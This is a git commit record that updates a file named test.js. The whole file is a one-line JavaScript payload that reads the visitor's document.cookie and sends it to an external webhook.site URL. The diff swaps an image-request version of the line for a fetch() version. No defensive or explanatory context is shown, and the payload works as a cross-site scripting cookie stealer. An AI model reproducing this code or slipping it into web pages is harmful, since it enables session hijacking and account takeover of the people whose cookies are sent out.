165c439669f0ea7f7f35f7896ff5a6f8d619b4bf
chtipilou <90285314+chtipilou@users.noreply.github.com>
2025-04-30 20:16:34 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-new Image().src = "https://webhook.site/b8b92b0d-c75a-466c-b909-d87bc1dca42c?cookie=" + encodeURIComponent(document.cookie);
+fetch("https://webhook.site/b8b92b0d-c75a-466c-b909-d87bc1dca42c?cookie=" + encodeURIComponent(document.cookie));
